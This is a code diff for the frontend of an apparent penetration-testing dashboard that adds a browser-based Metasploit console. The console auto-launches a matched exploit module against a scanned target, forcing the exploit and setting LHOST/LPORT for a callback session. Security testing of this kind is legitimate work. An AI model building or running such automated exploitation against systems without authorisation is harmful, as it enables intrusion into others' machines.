@@ -9,6 +9,7 @@
     let currentDetailScanId = null, eventSource = null, previousView = 'dashboard';
     let userRoles = [], userPermissions = [];
     let currentShellWs = null, currentTerm = null, fitAddon = null;
+    let currentMsfWs = null, currentMsfTerm = null, currentMsfFitAddon = null, currentMsfSessionId = null;
     let currentChainExecId = null;
 
     // ============================================
@@ -1496,6 +1497,10 @@
                             <input type="number" id="autoAttackLPORT" class="form-control fs-085" value="4444">
                         </div>
                     </div>
+                    <label class="d-flex align-center gap-05 mt-075 cursor-pointer">
+                        <input type="checkbox" id="autoAttackUseMsfConsole" checked>
+                        <span>Metasploit Live-Konsole beim Angriff automatisch öffnen</span>
+                    </label>
                 </div>
             `;
         } catch (e) {
@@ -1514,6 +1519,7 @@
         const targetIp = modal.dataset.targetIp;
         const lhost = document.getElementById('autoAttackLHOST')?.value || window.location.hostname;
         const lport = document.getElementById('autoAttackLPORT')?.value || '4444';
+        const useMsfConsole = !!document.getElementById('autoAttackUseMsfConsole')?.checked;
 
         const startBtn = document.getElementById('autoAttackStartBtn');
         const progressDiv = document.getElementById('autoAttackProgress');
@@ -1562,6 +1568,10 @@
             document.getElementById('autoAttackStatusText').textContent = `Angriff läuft... (${d.totalSteps} Schritte)`;
             const aapb = document.getElementById('autoAttackProgressBar'); if(aapb) aapb.style.width = '30%';
             document.getElementById('autoAttackProgressDetail').textContent = `${d.totalExploits} Exploits für ${d.attackableServices} Dienste werden getestet...`;
+
+            if (useMsfConsole) {
+                launchAutoAttackMsfConsole(scanId, targetIp, lhost, lport);
+            }
 
             // Poll for results
             let pollCount = 0;
@@ -2253,6 +2263,144 @@
             }
         });
     }
+
+    // ============================================
+    // ========== METASPLOIT BROWSER CONSOLE ==========
+    // ============================================
+    async function launchAutoAttackMsfConsole(scanId, targetIp, lhost, lport) {
+        try {
+            if (currentMsfSessionId) {
+                await window.hideMetasploitModal();
+            }
+            const matched = await api(`/api/exploits/matched/${scanId}/${targetIp}`);
+            const exploits = matched.exploits || [];
+            const candidate = exploits.find(ex =>
+                ex.source === 'metasploit' &&
+                ex.exploit_db_id &&
+                ex.exploit_db_id.startsWith('exploits/')
+            );
+
+            if (!candidate) {
+                showToast('info', 'MSF Hinweis', 'Kein geeignetes Metasploit-Modul für Live-Konsole gefunden.');
+                return;
+            }
+
+            const bootstrapCommands = [
+                `use ${candidate.exploit_db_id}`,
+                `set RHOSTS ${targetIp}`,
+                `set RPORT ${candidate.port || 445}`,
+                `set LHOST ${lhost}`,
+                `set LPORT ${lport}`,
+                'set ForceExploit true',
+                'exploit -z'
+            ];
+
+            const createResp = await api('/api/system/metasploit/session', 'POST', { bootstrapCommands });
+            currentMsfSessionId = createResp.sessionId;
+            document.getElementById('metasploitModal').classList.add('active');
+            setTimeout(() => initMetasploitSession(currentMsfSessionId), 100);
+            showToast('success', 'MSF Konsole', `Live-Konsole mit Modul ${candidate.exploit_db_id} gestartet.`);
+        } catch (e) {
+            showToast('warning', 'MSF Hinweis', `Live-Konsole konnte nicht gestartet werden: ${e.message}`);
+        }
+    }
+
+    window.showMetasploitModal = async function() {
+        try {
+            if (currentMsfSessionId) {
+                await window.hideMetasploitModal();
+            }
+            const createResp = await api('/api/system/metasploit/session', 'POST', {});
+            currentMsfSessionId = createResp.sessionId;
+            document.getElementById('metasploitModal').classList.add('active');
+            setTimeout(() => initMetasploitSession(currentMsfSessionId), 100);
+        } catch (e) {
+            showToast('error', 'MSF Fehler', e.message || 'Metasploit-Konsole konnte nicht gestartet werden.');
+        }
+    };
+
+    window.hideMetasploitModal = async function() {
+        document.getElementById('metasploitModal').classList.remove('active');
+
+        if (currentMsfWs) {
+            try { currentMsfWs.close(); } catch (e) {}
+            currentMsfWs = null;
+        }
+        if (currentMsfTerm) {
+            currentMsfTerm.dispose();
+            currentMsfTerm = null;
+        }
+
+        document.getElementById('metasploit-terminal-container').innerHTML = '';
+        document.getElementById('metasploitStatus').className = 'badge badge-gray';
+        document.getElementById('metasploitStatus').textContent = 'Getrennt';
+
+        if (currentMsfSessionId) {
+            try {
+                await api(`/api/system/metasploit/session/${currentMsfSessionId}`, 'DELETE');
+            } catch (e) {
+                // Ignore cleanup errors (session may already be closed)
+            }
+        }
+        currentMsfSessionId = null;
+    };
+
+    function initMetasploitSession(sessionId) {
+        const container = document.getElementById('metasploit-terminal-container');
+        if (!container) return;
+        container.innerHTML = '';
+
+        if (typeof Terminal === 'undefined') {
+            container.innerHTML = '<div class="color-red p-1">Fehler: Terminal-Bibliothek nicht geladen.</div>';
+            return;
+        }
+
+        const term = new Terminal({
+            cursorBlink: true,
+            theme: {
+                background: '#000000',
+                foreground: '#ffffff'
+            }
+        });
+        currentMsfFitAddon = new FitAddon.FitAddon();
+        term.loadAddon(currentMsfFitAddon);
+        term.open(container);
+        currentMsfFitAddon.fit();
+        currentMsfTerm = term;
+
+        window.addEventListener('resize', () => currentMsfFitAddon.fit());
+
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${protocol}//${window.location.host}/api/metasploit/${sessionId}`);
+        currentMsfWs = ws;
+
+        term.write('\r\n\x1b[33mStarte Metasploit-Konsole...\x1b[0m\r\n');
+
+        ws.onopen = () => {
+            document.getElementById('metasploitStatus').className = 'badge badge-green';
+            document.getElementById('metasploitStatus').textContent = 'Verbunden';
+            term.focus();
+        };
+
+        ws.onmessage = (event) => term.write(event.data);
+
+        ws.onclose = () => {
+            term.write('\r\n\x1b[31mMetasploit-Verbindung geschlossen.\x1b[0m\r\n');
+            document.getElementById('metasploitStatus').className = 'badge badge-red';
+            document.getElementById('metasploitStatus').textContent = 'Getrennt';
+        };
+
+        ws.onerror = () => {
+            term.write('\r\n\x1b[31mMetasploit-Verbindungsfehler.\x1b[0m\r\n');
+        };
+
+        term.onData((data) => {
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(data);
+            }
+        });
+    }
+
     window.hideChainExecDetailModal = function () {
         document.getElementById('chainExecDetailModal').classList.remove('active');
         currentChainExecId = null; // Reset monitoring
